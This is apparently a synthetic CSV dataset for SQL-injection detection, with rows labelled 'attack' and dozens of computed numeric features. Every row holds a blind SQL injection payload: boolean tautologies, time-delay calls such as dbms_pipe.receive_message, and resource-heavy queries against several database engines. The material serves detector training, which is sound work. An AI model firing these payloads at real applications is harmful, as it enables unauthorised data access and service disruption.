id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001822,attack,boolean,"1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  5098  =  5098",nearest_attack_euclidean,R000012,1.4749694985449573,141.24571398189593,28.366095197586123,3.932534756906882,67.58476200603468,13.879618784309809,41.4643807903445,18.316952401206937,0.4805583044063543,0.0963087676897995,0.2929513845125419,0.1301815433913043,0.0,0.950857203620813,0.0,0.0,1.0,1.6830475987930622,0.0,5.683047598793062,0.0,5.0,4.0,2.6830475987930624,0.0,0.3169524012069378,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.6830475987930624,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6830475987930624
SMOTE_001823,attack,boolean,"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000075,0.07926963162662387,147.40295055289755,34.0383762431331,3.823702574579496,41.191881215665504,24.0,56.13431685096585,26.0767524862662,0.27938474109305267,0.16287371180476426,0.38083816594305625,0.1769033811591268,1.0575643646996506,0.0,1.9616237568668997,0.0,0.0,2.0,0.0,11.01918812156655,0.0,2.0,1.0,10.0,1.0,0.0,0.9808118784334499,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.019188121566550143,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0191881215665504
SMOTE_001824,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000039,0.2676000982294639,82.84489918075285,22.077550409623576,3.202264724607085,13.387752048117882,15.767348771129269,39.84489918075285,13.844899180752845,0.16171348068481295,0.1902679698217587,0.48093569310908413,0.16708285638434422,0.0,4.0,0.9224495903764228,0.0,1.0,1.9224495903764227,0.0,6.0,0.0,0.0,0.0,3.8448991807528454,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0775504096235773,0.9224495903764227,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001825,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000062,1.013163718346436,92.80666689155682,24.3890196343008,3.2520400259861217,20.083529451451202,13.0,44.94509817150401,14.778039268601603,0.21671023954642538,0.14115814190095255,0.48348445578390853,0.15864716276871355,0.0,4.0,0.0,0.0,0.30549018284959906,1.694509817150401,0.0,7.389019634300802,0.0,0.6945098171504009,0.694509817150401,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001826,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000055,0.2393715555234193,90.45748734266527,22.0,3.062031884110456,17.6609295891658,13.203442246500522,45.593115506998956,14.0,0.1950099060566811,0.14624201098595246,0.5038963449456245,0.15485173801174185,0.0,4.0,0.06781408216684093,0.0,1.0,1.067814082166841,0.0,7.864371835666319,0.0,0.0,0.0,2.1356281643336814,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9321859178331593,0.06781408216684087,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001827,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000041,1.7648888885983747,148.68518870060257,35.62527191757617,4.213251229616991,66.93355719514555,18.25054383515234,45.18845171151659,18.312635958788086,0.4464732897339378,0.12380014895739958,0.30602703808169707,0.12369952322696554,1.9379078763642532,0.0,1.3747280824238313,0.0,1.0,2.0,0.0,5.937907876364253,0.0,0.3126359587880844,2.3747280824238315,5.0,1.0,0.0,0.6873640412119157,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.3126359587880845,0.0,1.0,1.0,0.31263595878808426,0.6873640412119155,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.312635958788084
SMOTE_001828,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R000074,1.3593141561278683,118.78554061929525,28.837048144352977,3.5869063167867785,42.415059175765485,13.48885556694107,49.71867402094168,13.162951855647023,0.3530270397359168,0.1160945005478484,0.418326390812887,0.11255206890334787,4.0,0.0,0.1629518556470234,0.0,0.0,1.0,0.0,7.674096288705954,0.0,0.1629518556470232,0.1629518556470233,1.162951855647023,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.8370481443529767,0.0,0.8370481443529767,0.0,0.0,0.0,1.0,0.1629518556470233,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8370481443529767,0.8370481443529767,3.6740962887059534
SMOTE_001829,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vxqs'  =  'vxqs",nearest_attack_euclidean,R000013,1.131702062260641,153.36151601826245,33.28809964632497,3.8577383781441394,48.073416371937476,17.502782920712463,59.35595017683751,28.429366548774993,0.3133470124807548,0.1136920924182562,0.3875830886929408,0.1853778064080482,3.7853167256125047,0.0,0.42936654877499003,0.0,0.0,2.0,0.0,11.785316725612505,0.0,2.0,1.0,8.85873309754998,1.0,0.0,0.21468327438749493,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.21468327438749507,0.0,0.21468327438749507,0.0,1.0,0.7853167256125049,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.214683274387495
SMOTE_001830,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000038,1.6215506336170404,89.3118378995298,23.977863282297623,3.260908108198354,19.466794923446436,13.0,42.88931641148812,13.955726564595247,0.21834181237183484,0.14688159578056345,0.4792371868415728,0.1555394050060289,0.0,4.0,0.0,0.0,0.5110683588511881,1.4889316411488118,0.0,6.977863282297624,0.0,0.4889316411488118,0.4889316411488118,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001831,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000021,2.0456207344831774,139.30864981129795,35.364187735877564,3.732551822809705,40.3827003774041,20.3827003774041,58.580274339542825,19.962974716946924,0.29029091193079987,0.14669900522667448,0.41995360119651054,0.14305648164601514,2.0,1.9814873584734625,1.3456750943510252,1.0,0.0,2.0,0.0,9.981487358473462,0.654324905648975,0.0,1.0,4.345675094351025,1.0,1.0,0.6728375471755126,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6728375471755125,0.0,1.3271624528244876,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001832,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000068,1.8761960109006286,112.1949628108244,28.39832093694147,4.183890103275241,72.20335812611705,3.7966418738829386,22.60167906305853,13.593283747765879,0.6437759180345197,0.03373181283139981,0.2015411910344978,0.12095107809958272,3.0,0.0,0.0,0.0,1.0,1.0,0.0,2.0,0.0,1.9916046847073492,2.7966418738829395,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001833,attack,boolean,"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000035,2.9762004351441558,132.6688142749482,33.80128856496892,3.708071707374622,38.735051419958566,18.735051419958562,55.06623714501036,20.132474290020717,0.2912521559177711,0.14028840396458747,0.4159321079689893,0.15252733214865213,4.132474290020719,0.4668814274948204,0.933762854989641,1.0,0.0,2.0,0.0,9.53311857250518,1.0662371450103594,0.0,1.0,3.9337628549896406,1.0,0.4668814274948205,0.4668814274948203,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4668814274948205,0.0,1.5331185725051797,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001834,attack,boolean,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000053,0.9182640164845791,64.73174205976201,25.134128970118997,3.7022629129175972,10.367362848854121,16.0,24.664677574702505,13.699701636205376,0.16598429403086173,0.24958316522116414,0.3725591847693448,0.2118733559786293,0.0,4.0,1.0,0.0,0.23323387873512524,2.0,0.0,2.932935514940501,2.0,0.7667661212648748,0.7667661212648748,3.2332338787351254,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001835,attack,boolean,"1'||  (  select 'xpjg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'",nearest_attack_euclidean,R000030,1.0853906511430211,88.0,27.99635947757477,3.7513793790462913,21.0,19.394175164119634,32.806552940365414,14.799271895514954,0.23863636363636365,0.22038835413772312,0.37280173795869787,0.16817354426721537,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.4014562089700915,0.0,0.20072810448504586,1.0,5.197087582059817,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.7992718955149541,0.7992718955149541,0.0,0.7992718955149543,0.0,1.200728104485046,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7992718955149543
SMOTE_001836,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,1.4457520721456636,101.94049936553192,29.42432138325228,3.5632743451924314,32.0,13.0,43.243213832522805,13.697285533009122,0.3153318201044487,0.12810355191743228,0.4228853269570496,0.13367930102106937,1.0,0.0,0.8486427665045607,0.0,1.0,1.0,0.0,7.848642766504561,0.0,1.0,1.0,2.848642766504561,1.0,0.0,0.4243213832522802,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001837,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""ymss""  =  ""ymss",nearest_attack_euclidean,R000043,1.8931632085419976,129.4137473671813,28.26900210625498,3.9356999153344714,71.31725052656374,5.9517515796912335,34.41374736718128,17.73099789374502,0.5513258061256501,0.046202030782966516,0.2656795104739017,0.13679265261748172,0.0,2.3654989468725103,0.6345010531274895,0.0,1.0,1.0,0.0,4.682749473436255,0.3172505265637448,3.413747367181277,3.3654989468725107,2.6345010531274893,0.0,1.0,0.31725052656374475,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001838,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000007,0.17968989827933107,137.39848875344506,32.0,4.21244129105393,69.0,16.0,38.11879100275606,14.279697750689015,0.5023208320824097,0.11648019294664574,0.2772951341519272,0.10390384081901727,0.0,0.0,2.0,0.0,1.0,2.0,0.0,4.2796977506890155,0.0,0.0,2.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001839,attack,boolean,"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",nearest_attack_euclidean,R000003,1.4211744317454365,66.15581722440402,11.155817224404014,1.869366502451842,6.5641014948282645,2.3668629183030134,44.42209138779799,12.802761423474749,0.09341272358379837,0.029960290105101428,0.6810175135842251,0.195609472726875,0.0,4.0,0.19723857652525112,0.0,0.0,1.0,0.0,7.605522846949498,0.0,0.0,0.0,1.1972385765252511,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.1972385765252509,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1972385765252511
SMOTE_001840,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000029,0.4829523018107993,109.19769084896568,27.258551864584195,3.52969863823634,35.55131118750518,13.0,46.77565559375259,13.8707240677079,0.32463587640927205,0.11934202735630436,0.4285424607686996,0.127479635465724,4.0,0.0,0.0,0.0,0.0,1.8707240677079018,0.0,6.258551864584197,1.7414481354158033,0.0,0.0,1.8707240677079016,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_001841,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000076,0.28056971843762296,138.15302354773735,32.0,4.110104275888246,65.86832590251109,16.474496075377107,41.0,14.810201569849157,0.47369978451601724,0.12066037760298859,0.29823819784951555,0.10740164003147856,0.0,0.0,2.0,0.0,1.0,2.0,0.0,5.094899215075421,0.0,0.09489921507542143,1.9051007849245787,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001842,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R000074,0.5007940714260214,121.7211195725486,28.731896420299837,3.568490655115947,44.39137852179901,13.0,51.195689260899506,13.134051789850082,0.3638347479926019,0.10707155905614021,0.42076931342922913,0.10832437952202884,4.0,0.0,0.0,0.0,0.0,1.1340517898500826,0.0,7.731896420299835,0.26810357970016496,0.0,0.0,1.1340517898500826,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_001843,attack,boolean,"1  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000034,1.090579905080073,130.83238361926925,32.46022701135898,3.780640651317355,37.920454022717955,17.071021551115397,51.38068103407693,24.460227011358977,0.2902590979888511,0.12922270603344677,0.39317280149715095,0.18734539448055115,0.23011350567948874,0.0,2.0,0.0,0.0,1.2301135056794887,0.0,11.0,0.0,2.0,1.0,9.230113505679489,0.23011350567948874,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.23011350567948874,0.0,0.7698864943205113,0.2301135056794887,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2301135056794887
SMOTE_001844,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt'  =  'qipt",nearest_attack_euclidean,R000020,0.44772332049506286,115.03522862931155,29.079632971485506,4.148656366586362,71.31853188594202,5.0,22.637063771884034,16.079632971485506,0.6202383894402729,0.04350213129254332,0.19642562785950585,0.13983385140767804,3.0,0.0,0.0,0.0,1.0,0.920367028514496,0.0,2.1592659429710084,0.0,5.0,4.0,1.9203670285144963,1.0,0.0,0.0,0.0,0.0,0.9203670285144961,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001845,attack,boolean,"1%"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000025,1.2932605519365634,130.03705955491102,31.897124345535783,4.143663850244241,71.5514378272321,8.448562172767893,33.69137303660735,16.345686518303676,0.5510178058952175,0.06491607038973934,0.2586104736278827,0.12545565008716036,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.4485621727678915,1.0,0.0,2.4485621727678923,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.5514378272321079,0.4485621727678921,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001846,attack,boolean,"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",nearest_attack_euclidean,R000015,3.9657186062963783,145.20384614097827,30.60032051174819,4.122722872454567,81.0032051174819,8.60032051174819,38.80096153524457,16.79935897650362,0.5573987365043058,0.059189056110793434,0.2672459123018142,0.1161662950830865,2.1990384647554304,0.0,0.0,0.0,1.0,1.3996794882518102,0.0,4.60032051174819,0.7993589765036202,0.0,2.60032051174819,2.3996794882518104,1.0,0.0,0.0,0.6003205117481899,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.39967948825181,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.39967948825181
SMOTE_001847,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000006,0.5318848805009719,88.62638769659443,24.62638769659443,3.429478121579276,21.469790772445826,13.469790772445824,39.68680615170278,14.0,0.24211801461792853,0.15182788388333807,0.4480463727132,0.15800772878553335,4.0,0.0,0.15659692414860826,0.0,0.0,1.8434030758513917,0.0,6.0,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.843403075851392,0.1565969241486082,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001848,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000042,1.4570503864284565,102.83119027063,28.868082674310003,3.5566035663243043,31.62269422477,13.0,43.717719146780006,14.490776899080002,0.30968014745899497,0.1274919606874935,0.4224995787097833,0.1403283131437283,0.6226942247700006,0.0,2.0,0.0,1.0,1.0,0.0,7.868082674310002,0.0,1.0,1.0,4.0,0.6226942247700006,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.6226942247700005,0.37730577522999936,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001849,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000010,1.714925177556545,87.80972565147137,24.46366977113007,3.2418673088915835,18.85467908452029,12.463669771130071,42.63669771130072,13.854679084520289,0.21477064215991856,0.1429750974039808,0.48508519044650544,0.15716906998959523,0.0,4.0,0.536330228869928,0.0,0.0,1.4636697711300721,0.0,6.927339542260144,0.0,0.46366977113007196,0.463669771130072,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4636697711300721,0.536330228869928,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001850,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000050,1.4685351425653888,139.38854056271495,31.901547492881708,4.291826381191082,81.8808030983064,7.901547492881707,32.8808030983064,16.725386873220426,0.5897106542596355,0.055859749874893436,0.23312514193024853,0.12130445393522252,3.725386873220427,0.0,0.0,0.0,1.0,1.0,0.0,3.450773746440854,0.0,1.3730656338978655,3.274613126779573,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.7253868732204269,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.725386873220427
